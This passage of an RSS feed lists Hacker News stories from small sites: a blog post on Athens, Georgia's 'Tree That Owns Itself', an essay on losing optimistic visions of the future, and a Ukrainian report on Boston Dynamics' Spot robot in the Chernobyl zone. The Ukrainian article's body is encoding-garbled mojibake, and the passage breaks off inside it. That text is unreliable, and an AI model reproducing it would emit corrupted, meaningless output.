<rss xmlns:dc="http://purl.org/dc/elements/1.1/" xmlns:content="http://purl.org/rss/1.0/modules/content/" xmlns:atom="http://www.w3.org/2005/Atom" version="2.0">
    <channel>
        <title>
<![CDATA[Hacker News - Small Sites - Score >= 10]]>
        </title>
        <description>
<![CDATA[Hacker News stories from domains that aren't in the top 1M and that have a score of at least 10. Updated nightly via https://github.com/awendland/hacker-news-small-sites]]>
        </description>
        <link>https://news.ycombinator.com</link>
        <generator>RSS for Node</generator>
        <lastBuildDate>Mon, 26 Oct 2020 20:29:35 GMT</lastBuildDate>
        <atom:link href="https://raw.githubusercontent.com/awendland/hacker-news-small-sites/generated/feeds/hn-small-sites-score-10.xml" rel="self" type="application/rss+xml"></atom:link>
        <pubDate>Mon, 26 Oct 2020 20:29:35 GMT</pubDate>
        <language>
<![CDATA[en-US]]>
        </language>
        <managingEditor>
<![CDATA[me@alexwendland.com (Alex Wendland)]]>
        </managingEditor>
        <ttl>240</ttl>
        <item>
            <title>
<![CDATA[A Tree That Owns Itself (2018)]]>
            </title>
            <description>
<![CDATA[
Score 34 | Comments 7 (<a href="https://news.ycombinator.com/item?id=24884133">thread link</a>) | @panic
<br/>
October 24, 2020 | https://thetreeographer.com/2018/03/22/the-tree-that-owns-itself/ | <a href="https://web.archive.org/web/*/https://thetreeographer.com/2018/03/22/the-tree-that-owns-itself/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
		<p>No matter how famous or how ancient, all trees are ultimately owned by someone. It could be a government, a trust, or even just an individual caretaker. However, one white oak tree in Athens, Georgia was reportedly so beloved by its owner that upon his death, he gave the tree ownership of itself in his will.<span id="more-2706"></span></p>
<h2>The Legend of the Tree That Owns Itself</h2>
<p>The legend goes that a particularly large and beautiful white oak played a special role in the childhood of its owner, Colonel William Henry Jackson. When he died some time between 1820 and 1832, he deeded the tree and the soil around it to the tree itself. Here is the reported text of his will:</p>
<blockquote><p>I, W. H. Jackson, of the county of Clarke, of the one part, and the oak tree&nbsp;… of the county of Clarke, of the other part: Witnesseth, That the said W. H. Jackson for and in consideration of the great affection which he bears said tree, and his great desire to see it protected has conveyed, and by these presents do convey unto the said oak tree entire possession of itself and of all land within eight feet [2.4 m] of it on all sides.</p></blockquote>
<div data-shortcode="caption" id="attachment_2712"><p><a href="https://thetreeographer.files.wordpress.com/2018/03/the_tree_that_owns_itself_4987035786-e1521714786992.jpg"><img loading="lazy" aria-describedby="caption-attachment-2712" data-attachment-id="2712" data-permalink="https://thetreeographer.com/2018/03/22/the-tree-that-owns-itself/the_tree_that_owns_itself_4987035786/" data-orig-file="https://thetreeographer.files.wordpress.com/2018/03/the_tree_that_owns_itself_4987035786-e1521714786992.jpg" data-orig-size="933,669" data-comments-opened="1" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="The_tree_that_owns_itself_(4987035786)" data-image-description="" data-medium-file="https://thetreeographer.files.wordpress.com/2018/03/the_tree_that_owns_itself_4987035786-e1521714786992.jpg?w=300" data-large-file="https://thetreeographer.files.wordpress.com/2018/03/the_tree_that_owns_itself_4987035786-e1521714786992.jpg?w=933" src="https://thetreeographer.files.wordpress.com/2018/03/the_tree_that_owns_itself_4987035786-e1521714786992.jpg?w=674&amp;h=484" alt="The_tree_that_owns_itself_(4987035786)" width="674" height="484" srcset="https://thetreeographer.files.wordpress.com/2018/03/the_tree_that_owns_itself_4987035786-e1521714786992.jpg?w=674&amp;h=484 674w, https://thetreeographer.files.wordpress.com/2018/03/the_tree_that_owns_itself_4987035786-e1521714786992.jpg?w=150&amp;h=108 150w, https://thetreeographer.files.wordpress.com/2018/03/the_tree_that_owns_itself_4987035786-e1521714786992.jpg?w=300&amp;h=215 300w, https://thetreeographer.files.wordpress.com/2018/03/the_tree_that_owns_itself_4987035786-e1521714786992.jpg?w=768&amp;h=551 768w, https://thetreeographer.files.wordpress.com/2018/03/the_tree_that_owns_itself_4987035786-e1521714786992.jpg 933w" sizes="(max-width: 674px) 100vw, 674px"></a></p><p id="caption-attachment-2712">The original Tree That Owns Itself in 1910</p></div>
<p>After that, the tree become known as the Tree that Owns Itself. However, there are a number of problems with the story’s validity. It originally ran as a front page story in the <em>Athens Banner Weekly</em> on August 12, 1890. That’s some 60 years after the supposed transaction took place, and there are no indications that anything special had happened to the tree before that (although it was known as Jackson’s Tree).</p>
<p>On top of that, the only witness to the will itself is the author of the article, and no one has been able to confirm that the statement above was ever made. However, the story became so popular that no one dared doubt the tree’s self-ownership. Effectively, the tree owned itself because everyone said it did.</p>
<p>Legally, of course, the tree isn’t able to own itself regardless of Jackson’s wishes. In fact, careful examination of property lines reveals that the tree isn’t even on his property. It’s officially part of the street (since it’s part of a median in the middle of the street), so its care falls to local authorities.</p>
<p>However, the tree is such a well respected landmark in the city that the Athens-Clarke County government has declared that in spite of the actual legality, the tree owns itself. Because they said so.</p>
<div data-shortcode="caption" id="attachment_2713"><p><a href="https://thetreeographer.files.wordpress.com/2018/03/the_tree_that_owns_itself2c_athens2c_georgia_28834283897329.jpg"><img aria-describedby="caption-attachment-2713" data-attachment-id="2713" data-permalink="https://thetreeographer.com/2018/03/22/the-tree-that-owns-itself/the_tree_that_owns_itself2c_athens2c_georgia_28834283897329/" data-orig-file="https://thetreeographer.files.wordpress.com/2018/03/the_tree_that_owns_itself2c_athens2c_georgia_28834283897329.jpg" data-orig-size="1500,941" data-comments-opened="1" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;Exp10000XL10000&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;1&quot;}" data-image-title="the_tree_that_owns_itself2c_athens2c_georgia_28834283897329" data-image-description="" data-medium-file="https://thetreeographer.files.wordpress.com/2018/03/the_tree_that_owns_itself2c_athens2c_georgia_28834283897329.jpg?w=300" data-large-file="https://thetreeographer.files.wordpress.com/2018/03/the_tree_that_owns_itself2c_athens2c_georgia_28834283897329.jpg?w=1024" src="https://thetreeographer.files.wordpress.com/2018/03/the_tree_that_owns_itself2c_athens2c_georgia_28834283897329.jpg?w=1024&amp;h=642" alt="the_tree_that_owns_itself2c_athens2c_georgia_28834283897329" srcset="https://thetreeographer.files.wordpress.com/2018/03/the_tree_that_owns_itself2c_athens2c_georgia_28834283897329.jpg?w=1024&amp;h=642 1024w, https://thetreeographer.files.wordpress.com/2018/03/the_tree_that_owns_itself2c_athens2c_georgia_28834283897329.jpg?w=150&amp;h=94 150w, https://thetreeographer.files.wordpress.com/2018/03/the_tree_that_owns_itself2c_athens2c_georgia_28834283897329.jpg?w=300&amp;h=188 300w, https://thetreeographer.files.wordpress.com/2018/03/the_tree_that_owns_itself2c_athens2c_georgia_28834283897329.jpg?w=768&amp;h=482 768w, https://thetreeographer.files.wordpress.com/2018/03/the_tree_that_owns_itself2c_athens2c_georgia_28834283897329.jpg 1500w" sizes="(max-width: 1024px) 100vw, 1024px"></a></p><p id="caption-attachment-2713">A postcard from the 1930s commemorating the Tree That Owns Itself</p></div>
<h2>Can a tree have rights?</h2>
<p>It might seem strange that a tree can own anything, let alone itself, but there is actually some legal precedent. Although they usually take a back seat to animal rights, plant rights have been discussed in several countries around the world.</p>
<p>In the Netherlands, a party called <a href="https://in.reuters.com/article/us-dutch-election-plants/plant-rights-party-to-contest-next-dutch-election-idINTRE62S2HA20100329">the Party for the Plants</a> was created to try to snag a few seats in the 2010 parliamentary elections. Although they weren’t particularly successful, their platform focused exclusively on promoting biodiversity and protecting plants from being harvested for biofuels.</p>
<p>More success has been found in New Zealand, where for the first time anywhere a forest was granted legal personhood and ownership of itself. The&nbsp;Te Urewera Act of 2014 changed the legal status of Te Urewera, a forest sacred to the Maori people, from a Natural Park into <a href="http://maorilawreview.co.nz/2014/10/tuhoe-crown-settlement-te-urewera-act-2014/">its own legal entity</a>.</p>

<p>Obviously the forest can’t speak for itself, so a board was set up “to act on behalf of, and in the name of, Te Urewera”. In March 2017 a second act was passed granting similar rights to the Whanganui River, since the local Maori tribe consider the river itself to be their ancestor.</p>
<p>Although it doesn’t go as far as giving trees and other plants ownership of themselves, the Clean Water Act of 1972 in the United States effectively grants them some rights. Under the ‘natural resource damage’ provisions of the law, trees and other resources have some basic rights. It’s the government, however, that’s entrusted with protecting those rights, although any money earned through litigation must be spent on the resource itself. Essentially, the money <em>belongs</em> to the resource.</p>
<h2>The Son of The Tree That Owns Itself</h2>
<p>The Tree That Owns Itself might have been granted semi-legal status in Athens-Clarke County, but that didn’t protect it from the whims of Mother Nature. It was heavily damaged in an ice storm in 1907, and eventually fell down in 1942. Many suspected that the tree had died long before falling.</p>
<p>But if the tree owned land, surely it must pass on to its next of kin. A tree grown from an acorn of the Tree That Owns Itself was selected as the heir, an transplanted into its new home in 1946. It also inherited the name, although it’s also referred to as the Son of the Tree That Owns Itself.</p>
<div data-shortcode="caption" id="attachment_2710"><p><a href="https://thetreeographer.files.wordpress.com/2018/03/treethatownsitself.jpg"><img aria-describedby="caption-attachment-2710" data-attachment-id="2710" data-permalink="https://thetreeographer.com/2018/03/22/the-tree-that-owns-itself/treethatownsitself/" data-orig-file="https://thetreeographer.files.wordpress.com/2018/03/treethatownsitself.jpg" data-orig-size="750,563" data-comments-opened="1" data-image-meta="{&quot;aperture&quot;:&quot;2.8&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;CYBERSHOT&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;1097078702&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;9.7&quot;,&quot;iso&quot;:&quot;100&quot;,&quot;shutter_speed&quot;:&quot;0.008&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;1&quot;}" data-image-title="Treethatownsitself" data-image-description="" data-medium-file="https://thetreeographer.files.wordpress.com/2018/03/treethatownsitself.jpg?w=300" data-large-file="https://thetreeographer.files.wordpress.com/2018/03/treethatownsitself.jpg?w=750" src="https://thetreeographer.files.wordpress.com/2018/03/treethatownsitself.jpg?w=1070" alt="Treethatownsitself" srcset="https://thetreeographer.files.wordpress.com/2018/03/treethatownsitself.jpg 750w, https://thetreeographer.files.wordpress.com/2018/03/treethatownsitself.jpg?w=150 150w, https://thetreeographer.files.wordpress.com/2018/03/treethatownsitself.jpg?w=300 300w" sizes="(max-width: 750px) 100vw, 750px"></a></p><p id="caption-attachment-2710">The Son of The Tree That Owns Itself</p></div>
<p>It’s now been more than 70 years since the tree moved in to the quiet residential neighborhood on Finley Street, and it appears to be doing well. Despite its unknown legal status, the legend lives on with a plaque commemorating the words that started it all. Slightly edited to be more intelligible to modern readers, it reads:</p>
<blockquote><p>For and in consideration of the great love I bear this tree and the and the great desire I have for its protection for all time, I convey entire possession of itself and all land within eight feed of the tree on all sides<br>
-William M Jackson</p></blockquote>
<p><a href="https://thetreeographer.files.wordpress.com/2018/03/forandinconsideration.jpg"><img data-attachment-id="2711" data-permalink="https://thetreeographer.com/2018/03/22/the-tree-that-owns-itself/forandinconsideration/" data-orig-file="https://thetreeographer.files.wordpress.com/2018/03/forandinconsideration.jpg" data-orig-size="693,563" data-comments-opened="1" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;1&quot;}" data-image-title="Forandinconsideration" data-image-description="" data-medium-file="https://thetreeographer.files.wordpress.com/2018/03/forandinconsideration.jpg?w=300" data-large-file="https://thetreeographer.files.wordpress.com/2018/03/forandinconsideration.jpg?w=693" src="https://thetreeographer.files.wordpress.com/2018/03/forandinconsideration.jpg?w=1070" alt="Forandinconsideration" srcset="https://thetreeographer.files.wordpress.com/2018/03/forandinconsideration.jpg 693w, https://thetreeographer.files.wordpress.com/2018/03/forandinconsideration.jpg?w=150 150w, https://thetreeographer.files.wordpress.com/2018/03/forandinconsideration.jpg?w=300 300w" sizes="(max-width: 693px) 100vw, 693px"></a></p>
<p>If you enjoyed this article about the Tree That Owns Itself, check out the&nbsp;<a href="https://thetreeographer.com/archive/">archive</a>&nbsp;for more amazing tree stories. Also check out the&nbsp;<a href="https://www.facebook.com/TheTreeographer/">Facebook page</a>, with a few extra tree goodies throughout the week. Subscribe below to receive notifications whenever a new tree story is published.</p>
<p>As always, feel free to drop a comment below. It’s always nice to hear from you!</p>

			</div></div>]]>
            </description>
            <link>https://thetreeographer.com/2018/03/22/the-tree-that-owns-itself/</link>
            <guid isPermaLink="false">hacker-news-small-sites-24884133</guid>
            <pubDate>Sun, 25 Oct 2020 05:51:54 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[No More Bold Visions of the Future]]>
            </title>
            <description>
<![CDATA[
Score 47 | Comments 48 (<a href="https://news.ycombinator.com/item?id=24882565">thread link</a>) | @riverlong
<br/>
October 24, 2020 | https://jayriverlong.github.io/2020/10/24/future.html | <a href="https://web.archive.org/web/*/https://jayriverlong.github.io/2020/10/24/future.html">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div id="main" role="main"> <article role="article">  <p>What do I want the future to be like? What amazing inventions do I want to see, and help build in my lifetime? I realized this morning that I don’t know. I was shocked.</p> <p>I’ve been tinkering with technology since I was a child, and I’ve been investing in early-stage companies for the past five years. More than sixty bets on the future. I’m meant to have bold visions of a better world, theses I support, and capital that I allocate in a technologically optimistic way. I began investing in startups because I wanted to help shape the future. And while I still get excited talking to founders with bold ideas, I have none of my own.</p> <p>When I was a teen, growing up on a diet of Carl Sagan’s Cosmos and Alvin Toffler’s Futurism, I had plenty of big ideas: spaceflight, supersonic travel, mag-lev trains, geodesic domes, bio-nanotech for longevity, and social organization to provide maximum freedom for all. Cheesy, but optimistic.</p> <p>Now I am 29 and I have no big, optimistic ideas. I think of plenty of arbitrages and improvements in efficiency. And while I believe that better infrastructure enables more construction and innovation, closing an obscure pricing gap just isn’t like dreams of great adventure and exploration on the frontier of human experience and possibility.</p> <p>I spend much time thinking about solutions to existing problems – the incentive mismatch in mass media that is causing accelerating polarization, how to remedy the effects of climate change, and so on. But these are all <em>fixes</em>, reactions. It feels like I’m in the belly of the ship, frenetically plugging leaky holes, never even having the space of mind to think <em>where the ship should go</em>. Ostensibly, those decisions are made on the bridge of the ship, which, in October 2020, seems to be populated by well-intentioned individuals, but hamstrung in their ability to make good collective decisions.</p> <p>Recent years have shown me how difficult it is to make <em>any</em> meaningful public decision. Every debate is endlessly contentious, every subject has meaningful nuance, and every decision has exceedingly hard-to-predict second-order-effects. The world is much more complex than it was even twenty years ago, and the effects are paralyzing. This is clearly felt among policymakers, but I feel it even as a technologist: I understand that virtually all tools can be used – and more often than not, <em>will</em> be used – for both good and evil, and how hard the results are to predict over years in our dynamic world. I learned that technology can rarely solve fundamental social problems, and I’ve seen the public perception rollercoaster of “this technology/person/policy is good” to “this is evil” more times than I can count.</p> <p>This puts me in a real bind for having high-conviction views that aren’t microscopically focused. As an example, for the past few years I have struggled developing a long-term view on bitcoin. By network effect, I think it is clear that in the long term, we will have <em>either</em> fiat or crypto – either fully centralized or fully decentralized – not both. Which world do I want to live in? I’m not sure. On the one hand, it is clear that our existing US financial system is fragile with systemic risk, a playball exposed to potentially irresponsible governance. You might call its mechanics unfair to the masses, but you’d also need to point out that it has <em>actually worked</em> in creating prosperity over the past 110 years. (And, comparing the US to other countries, it has worked remarkably well!) I agree with need for overhaul of the system, but I’m not sure if it’s wise throw out the entire thing and open up the world’s largest power vacuum in the process. This rarely ends well. I cannot tell, with intellectual honesty, which avenue is best to pursue. I doubt that anyone does.</p> <p>Other arenas of big problems and changes yield similar dilemmas. Perhaps consequently, I have found myself not dreaming big anymore. I dream small, where the effects are predictable. On dreaming big, there is the paralysis of responsibility and effects, but there is also a level of cynicism that has come to me over the years, as big dreams turn out to be much more fraught and complicated as they move into reality. The nuance, complexity, difficulty, responsibility, and often <em>irreversibility</em> in effecting big changes has slowly removed the stars from my eyes as I look at technology. Maybe that’s a good thing as I come to appreciate the gravity of change.</p> <p>But at the same time, if we don’t take big, bold, bets, we’ll be forever stuck in the valleys of local optima. As Bezos says, the size of your risk-taking should increase with the size of your enterprise – at scale, we should be taking many daring gambles, all the time. But it doesn’t feel like that’s really happening. It feels like we spend lots of effort debating marginal nuance, sitting in the belly of the ship doing maintenance, rather than charting the course forward.</p> <p>It is difficult to be an optimist in 2020. I admire the few<sup id="fnref:2" role="doc-noteref"><a href="#fn:2">1</a></sup> that still have the courage to dream big and to remind ourselves that there <em>is</em> a future that could be amazing and that is worth fighting for.</p>  <hr>  <br> </article> </div></div>]]>
            </description>
            <link>https://jayriverlong.github.io/2020/10/24/future.html</link>
            <guid isPermaLink="false">hacker-news-small-sites-24882565</guid>
            <pubDate>Sat, 24 Oct 2020 22:57:23 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Boston Dynamics Spot Measured Background Radiation in Chernobyl Exclusion Zone]]>
            </title>
            <description>
<![CDATA[
Score 45 | Comments 27 (<a href="https://news.ycombinator.com/item?id=24882438">thread link</a>) | @app4soft
<br/>
October 24, 2020 | https://www.ukrinform.ua/rubric-technology/3122689-robotpes-vid-boston-dynamics-zamirav-radiaciu-u-zoni-vidcuzenna.html | <a href="https://web.archive.org/web/*/https://www.ukrinform.ua/rubric-technology/3122689-robotpes-vid-boston-dynamics-zamirav-radiaciu-u-zoni-vidcuzenna.html">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
    <p>Ð�Ð° Ñ‚ÐµÑ€Ð¸Ñ‚Ð¾Ñ€Ñ–Ñ— Ð·Ð¾Ð½Ð¸ Ð²Ñ–Ð´Ñ‡ÑƒÐ¶ÐµÐ½Ð½Ñ� Ð²Ð¿ÐµÑ€ÑˆÐµ Ð¿Ñ€Ð¾Ð²ÐµÐ´ÐµÐ½Ð¾ Ð²Ð¸Ð¿Ñ€Ð¾Ð±ÑƒÐ²Ð°Ð½Ð½Ñ� Ð°Ð²Ñ‚Ð¾Ð½Ð¾Ð¼Ð½Ð¾Ð³Ð¾ Ñ€Ð¾Ð±Ð¾Ñ‚Ð° Boston Dynamics «SPOT».</p>

    <div>
         
        <p>ÐŸÑ€Ð¾ Ñ†Ðµ Ð£ÐºÑ€Ñ–Ð½Ñ„Ð¾Ñ€Ð¼Ñƒ Ð¿Ð¾Ð²Ñ–Ð´Ð¾Ð¼Ð¸Ð»Ð¸ Ð² Ð”ÐµÑ€Ð¶Ð°Ð²Ð½Ð¾Ð¼Ñƒ Ð°Ð³ÐµÐ½Ñ‚Ñ�Ñ‚Ð²Ñ– Ð· ÑƒÐ¿Ñ€Ð°Ð²Ð»Ñ–Ð½Ð½Ñ� Ð·Ð¾Ð½Ð¾ÑŽ Ð²Ñ–Ð´Ñ‡ÑƒÐ¶ÐµÐ½Ð½Ñ� (Ð”Ð�Ð—Ð’).</p>

<p>Ð—Ð°Ð·Ð½Ð°Ñ‡Ð°Ñ”Ñ‚ÑŒÑ�Ñ�, Ñ‰Ð¾ Ð²Ð¸Ð¿Ñ€Ð¾Ð±ÑƒÐ²Ð°Ð½Ð½Ñ� Ð·Ð´Ñ–Ð¹Ñ�Ð½ÐµÐ½Ð¾ Ð´Ð¾Ñ�Ð»Ñ–Ð´Ð½Ð¸Ñ†ÑŒÐºÐ¾ÑŽ Ð³Ñ€ÑƒÐ¿Ð¾ÑŽ Ð‘Ñ€Ñ–Ñ�Ñ‚Ð¾Ð»ÑŒÑ�ÑŒÐºÐ¾Ð³Ð¾ ÑƒÐ½Ñ–Ð²ÐµÑ€Ñ�Ð¸Ñ‚ÐµÑ‚Ñƒ Ñ�Ð¿Ñ–Ð»ÑŒÐ½Ð¾ Ð· Ñ„Ð°Ñ…Ñ–Ð²Ñ†Ñ�Ð¼Ð¸ Ð”ÐµÑ€Ð¶Ð°Ð²Ð½Ð¾Ð³Ð¾ Ñ�Ð¿ÐµÑ†Ñ–Ð°Ð»Ñ–Ð·Ð¾Ð²Ð°Ð½Ð¾Ð³Ð¾ Ð¿Ñ–Ð´Ð¿Ñ€Ð¸Ñ”Ð¼Ñ�Ñ‚Ð²Ð° «Ð¦ÐµÐ½Ñ‚Ñ€Ð°Ð»ÑŒÐ½Ðµ Ð¿Ñ–Ð´Ð¿Ñ€Ð¸Ñ”Ð¼Ñ�Ñ‚Ð²Ð¾ Ð· Ð¿Ð¾Ð²Ð¾Ð´Ð¶ÐµÐ½Ð½Ñ� Ð· Ñ€Ð°Ð´Ñ–Ð¾Ð°ÐºÑ‚Ð¸Ð²Ð½Ð¸Ð¼Ð¸ Ð²Ñ–Ð´Ñ…Ð¾Ð´Ð°Ð¼Ð¸» (Ð”Ð¡ÐŸ «Ð¦ÐŸÐŸÐ&nbsp;Ð’»).</p>

<figure><img alt="" height="840" src="https://static.ukrinform.com/photos/2020_10/1603468013-980.jpg" title="" width="630"></figure>

<p>ÐŸÑ–Ð´ Ñ‡Ð°Ñ� Ñ€Ð¾Ð±Ñ–Ñ‚ Ð²Ð¸ÐºÐ¾Ñ€Ð¸Ñ�Ñ‚Ð¾Ð²ÑƒÐ²Ð°Ð»Ð¸ Ð±ÐµÐ·Ð¿Ñ–Ð»Ð¾Ñ‚Ð½Ñ– Ð»Ñ–Ñ‚Ð°Ð»ÑŒÐ½Ñ– Ð°Ð¿Ð°Ñ€Ð°Ñ‚Ð¸, Ð½Ð°Ð·ÐµÐ¼Ð½Ñ– Ñ€Ð¾Ð±Ð¾Ñ‚Ð¸Ð·Ð¾Ð²Ð°Ð½Ñ– Ñ�Ð¸Ñ�Ñ‚ÐµÐ¼Ð¸, Ð´Ð°Ñ‚Ñ‡Ð¸ÐºÐ¸-Ñ�ÐºÐ°Ð½ÐµÑ€Ð¸ Ð´Ð»Ñ� Ð¾Ñ†Ñ–Ð½ÐºÐ¸ Ñ€Ð¾Ð·Ð¿Ð¾Ð´Ñ–Ð»Ñƒ Ñ€Ð°Ð´Ñ–Ð¾Ð°ÐºÑ‚Ð¸Ð²Ð½Ð¸Ñ… Ð¼Ð°Ñ‚ÐµÑ€Ñ–Ð°Ð»Ñ–Ð² Ð½Ð° Ð¿Ð»Ð¾Ñ‰Ñ– Ñ‚Ð° Ð² Ð¿Ñ€Ð¾Ñ�Ñ‚Ð¾Ñ€Ñ– (Ð³Ð°Ð¼Ð¼Ð°-Ñ�Ð¿ÐµÐºÑ‚Ñ€Ð¾Ð¼ÐµÑ‚Ñ€, Ð»Ñ–Ð´Ð°Ñ€, Ñ„Ð¾Ñ‚Ð¾Ð³Ñ€Ð°Ð¼Ð¼ÐµÑ‚Ñ€Ñ–Ñ�, Ð³Ñ–Ð¿ÐµÑ€Ñ�Ð¿ÐµÐºÑ‚Ñ€Ð°Ð»ÑŒÐ½Ð¸Ð¹ Ñ‚Ð° Ð½ÐµÐ¹Ñ‚Ñ€Ð¾Ð½Ð½Ð¸Ð¹ Ð´Ð°Ñ‚Ñ‡Ð¸ÐºÐ¸).</p>

<figure><img alt="" height="840" src="https://static.ukrinform.com/photos/2020_10/1603468013-913.jpg" title="" width="630"></figure>

<p>Ð—Ð¾ÐºÑ€ÐµÐ¼Ð°, Ð¿Ñ€Ð¾Ð²Ð¾Ð´Ð¸Ð»Ð¸Ñ�ÑŒ Ñ€Ð°Ð´Ñ–Ð¾Ð¼ÐµÑ‚Ñ€Ð¸Ñ‡Ð½Ñ– Ñ‚Ð° Ð³ÐµÐ¾Ñ„Ñ–Ð·Ð¸Ñ‡Ð½Ñ– Ñ€Ð¾Ð±Ð¾Ñ‚Ð¸ Ð½Ð° Ñ‚ÐµÑ€Ð¸Ñ‚Ð¾Ñ€Ñ–Ñ— Ð´Ð²Ð¾Ñ… Ñ�ÐµÐºÑ‚Ð¾Ñ€Ñ–Ð² Ð¿ÑƒÐ½ÐºÑ‚Ñƒ Ñ‚Ð¸Ð¼Ñ‡Ð°Ñ�Ð¾Ð²Ð¾Ñ— Ð»Ð¾ÐºÐ°Ð»Ñ–Ð·Ð°Ñ†Ñ–Ñ— Ñ€Ð°Ð´Ñ–Ð¾Ð°ÐºÑ‚Ð¸Ð²Ð½Ð¸Ñ… Ð²Ñ–Ð´Ñ…Ð¾Ð´Ñ–Ð² «Ð&nbsp;ÑƒÐ´Ð¸Ð¹ Ð»Ñ–Ñ�» Ñ‚Ð° Ð½Ð° Ñ‚ÐµÑ€Ð¸Ñ‚Ð¾Ñ€Ñ–Ñ�Ñ… Ð¿ÑƒÐ½ÐºÑ‚Ñ–Ð² Ð·Ð°Ñ…Ð¾Ñ€Ð¾Ð½ÐµÐ½Ð½Ñ� Ñ€Ð°Ð´Ñ–Ð¾Ð°ÐºÑ‚Ð¸Ð²Ð½Ð¸Ñ… Ð²Ñ–Ð´Ñ…Ð¾Ð´Ñ–Ð² «ÐŸÑ–Ð´Ð»Ñ–Ñ�Ð½Ð¸Ð¹» Ñ– «Ð‘ÑƒÑ€Ñ�ÐºÑ–Ð²ÐºÐ°».</p>

<figure><img alt="" height="840" src="https://static.ukrinform.com/photos/2020_10/1603468013-197.jpg" title="" width="630"></figure>

<p>Ð—Ð° Ñ€ÐµÐ·ÑƒÐ»ÑŒÑ‚Ð°Ñ‚Ð°Ð¼Ð¸ Ñ€Ð¾Ð±Ñ–Ñ‚, Ð½Ð° «ÐŸÑ–Ð´Ð»Ñ–Ñ�Ð½Ð¾Ð¼Ñƒ» Ñ‚Ð° «Ð‘ÑƒÑ€Ñ�ÐºÑ–Ð²Ñ†Ñ–» Ð±ÑƒÐ´Ðµ Ð¾Ñ‚Ñ€Ð¸Ð¼Ð°Ð½Ð¾ Ð·Ð¾Ð±Ñ€Ð°Ð¶ÐµÐ½Ð½Ñ� Ñƒ 3D-Ñ„Ð¾Ñ€Ð¼Ð°Ñ‚Ñ– Ñ– ÐºÐ°Ñ€Ñ‚Ð¸ Ñ€Ð¾Ð·Ð¿Ð¾Ð´Ñ–Ð»Ñƒ Ð°ÐºÑ‚Ð¸Ð²Ð½Ð¾Ñ�Ñ‚Ñ– Ñ€Ð°Ð´Ñ–Ð¾Ð½ÑƒÐºÐ»Ñ–Ð´Ñ–Ð². Ð¢Ð°ÐºÐ¾Ð¶ Ð´Ð¾Ñ�Ð»Ñ–Ð´Ð½Ð¸ÐºÐ¸ Ð¾Ð±Ñ–Ñ†Ñ�ÑŽÑ‚ÑŒ Ð½Ð°Ð´Ð°Ñ‚Ð¸ Ð·Ð¾Ð±Ñ€Ð°Ð¶ÐµÐ½Ð½Ñ� Ð¿ÑƒÐ½ÐºÑ‚Ñƒ «Ð&nbsp;ÑƒÐ´Ð¸Ð¹ Ð»Ñ–Ñ�» Ñ–Ð· Ð´Ñ–Ð»Ñ�Ð½ÐºÐ°Ð¼Ð¸, Ñ�ÐºÑ– Ð¼Ð°ÑŽÑ‚ÑŒ Ð²Ð¸Ñ�Ð¾ÐºÑƒ Ð¿Ð¾Ñ‚ÑƒÐ¶Ð½Ñ–Ñ�Ñ‚ÑŒ Ð´Ð¾Ð·Ð¸.</p>

<section><b>Ð§Ð¸Ñ‚Ð°Ð¹Ñ‚Ðµ Ñ‚Ð°ÐºÐ¾Ð¶: </b><a href="https://www.ukrinform.ua/rubric-technology/3023941-u-singapuri-parki-patruluut-robotipsi-pilnuut-za-distancieu.html" target="_blank">Ð£ Ð¡Ñ–Ð½Ð³Ð°Ð¿ÑƒÑ€Ñ– Ð¿Ð°Ñ€ÐºÐ¸ Ð¿Ð°Ñ‚Ñ€ÑƒÐ»ÑŽÑŽÑ‚ÑŒ Ñ€Ð¾Ð±Ð¾Ñ‚Ð¸-Ð¿Ñ�Ð¸ – Ð¿Ð¸Ð»ÑŒÐ½ÑƒÑŽÑ‚ÑŒ Ð·Ð° Ð´Ð¸Ñ�Ñ‚Ð°Ð½Ñ†Ñ–Ñ”ÑŽ</a></section>

<p>Ð’Ð¸ÐºÐ¾Ð½Ð°Ð½Ñ– Ñ€Ð¾Ð±Ð¾Ñ‚Ð¸ Ð´Ð¾Ð·Ð²Ð¾Ð»Ñ�Ñ‚ÑŒ Ð”Ð¡ÐŸ «Ð¦ÐŸÐŸÐ&nbsp;Ð’» Ð¾Ð½Ð¾Ð²Ð¸Ñ‚Ð¸ ÐºÐ°Ñ€Ñ‚Ð¸ Ñ€Ð¾Ð·Ð¿Ð¾Ð´Ñ–Ð»Ñƒ Ñ€Ð°Ð´Ñ–Ð°Ñ†Ñ–Ð¹Ð½Ð¾Ð³Ð¾ Ð·Ð°Ð±Ñ€ÑƒÐ´Ð½ÐµÐ½Ð½Ñ�.</p>

